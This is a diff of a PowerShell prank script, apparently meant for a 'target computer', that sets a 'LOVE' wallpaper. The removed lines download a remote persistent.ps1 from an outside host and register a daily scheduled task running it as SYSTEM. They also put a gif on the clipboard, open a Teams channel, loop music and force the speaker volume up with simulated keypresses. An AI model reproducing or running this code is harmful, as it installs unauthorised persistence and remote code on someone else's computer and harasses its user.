@@ -6,25 +6,10 @@
 
 $Data = @{
     WallpaperURL              = "https://juanbanpar.github.io/GRADLOVE/files/wall.jpg"
-    GifURL                    = "https://juanbanpar.github.io/GRADLOVE/files/heart-locket.gif"
-    MusicURL                  = "https://juanbanpar.github.io/GRADLOVE/files/music.wav"
-    PersistentURL             = "https://juanbanpar.github.io/GRADLOVE/files/persistent.ps1"
     DownloadDirectory         = "C:\amor"
 }
 
 $WallpaperDest  = $($Data.DownloadDirectory + "\Wallpaper." + ($Data.WallpaperURL -replace ".*\."))
-$GifDest  = $($Data.DownloadDirectory + "\Gif." + ($Data.GifURL -replace ".*\."))
-$MusicDest = $($Data.DownloadDirectory + "\Music." + ($Data.MusicURL -replace ".*\."))
-$PersistentDest = $($Data.DownloadDirectory + "\Persistent." + ($Data.PersistentURL -replace ".*\."))
-
-# Creates the LOVE folder on the target computer
-New-Item -ItemType Directory -Path $Data.DownloadDirectory -ErrorAction SilentlyContinue
-
-# Downloads SO MUCH LOVE
-Start-BitsTransfer -Source $Data.WallpaperURL -Destination $WallpaperDest
-Start-BitsTransfer -Source $Data.GifURL -Destination $GifDest
-Start-BitsTransfer -Source $Data.MusicURL -Destination $MusicDest
-Start-BitsTransfer -Source $Data.PersistentURL -Destination $PersistentDest
 
 # Function of LOVE
 Function Set-WallPaper {
@@ -103,35 +88,5 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
-# Make our LOVE last forever
-$Trigger = New-ScheduledTaskTrigger -Daily -At "11:00 am"
-$Action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "C:\amor\persistent.ps1"
-$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-
-Register-ScheduledTask -TaskName "Amor" -Trigger $Trigger -Action $Action -Principal $Principal
-
 # Sets LOVE images
 Set-WallPaper -Image $WallpaperDest -Style Fit
-
-# Add to the clipboard LOVE gif
-Get-ChildItem $GifDest | Set-Clipboard
-
-# Open my favourite channel to express HOW MUCH LOVE I have
-start "https://teams.microsoft.com/l/channel/19%3acd6d7b457ff84d86b3a182a310139597%40thread.tacv2/Random?groupId=1a0ebcf0-5300-494f-a968-317e4e6c7a42&tenantId=66102552-ecf2-44f2-aeee-14fa85460e0f"
-
-# Sleep 5 minutes to wait for the LOVER to be back at the computer
-Start-Sleep -Seconds 300
-
-# Plays LOVE music
-$player = New-Object System.Media.SoundPlayer $MusicDest
-$player.PlayLooping()
-
-# Function to say LOUDLY how much I LOVE YOU
-# but increase volume by steps
-Function Set-Speaker($Volume) {
-    $wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175);Start-Sleep -Seconds 1}	
-}
-Set-Speaker -Volume 50
-
-# Sleep the shell so we can HEAR just enough time how MUCH I LOVE YOU
-Start-Sleep -Seconds 3600
